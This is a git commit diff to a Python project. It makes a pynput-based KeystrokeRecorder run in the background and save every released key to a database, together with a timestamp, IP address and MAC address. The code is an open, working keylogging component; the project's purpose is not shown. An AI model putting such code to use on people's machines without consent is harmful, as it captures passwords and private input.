141b49b66c0968bf200dce2f4db9a5809f10d776
anamatasanch <60212081+anamatasanch@users.noreply.github.com>
2021-10-05 08:24:15 -0600

    Added DAO use

--- src/services/KeystrokeRecorder.py
+++ src/services/KeystrokeRecorder.py
@@ -1,13 +1,14 @@
 import pynput
+from src.db.KeystrokeDAO import KeystrokeDAO
 from src.models.Keystroke import Keystroke
 from src.models.recorder import Recorder
 
 
 class KeystrokeRecorder(Recorder):
     def __init__(self):
+        self.keystroke_collection = KeystrokeDAO()
         self.listener = pynput.keyboard.Listener(on_release=self.on_release)
         self.listener.start()
-        self.listener.join()
 
     def on_release(self, key):
         try:
@@ -16,10 +17,10 @@ class KeystrokeRecorder(Recorder):
             self.save_keystroke(str(key)[4:])
 
     def save_keystroke(self, key):
-        time = None
-        ip = None
-        mac = None
-        Keystroke(key, time, ip, mac, [])
+        time = super().get_timestemp()
+        ip = super().get_ip()
+        mac = super().get_mac()
+        self.keystroke_collection.create(Keystroke(key, time, ip, mac, []))
 
     def stop(self):
         self.listener.stop()
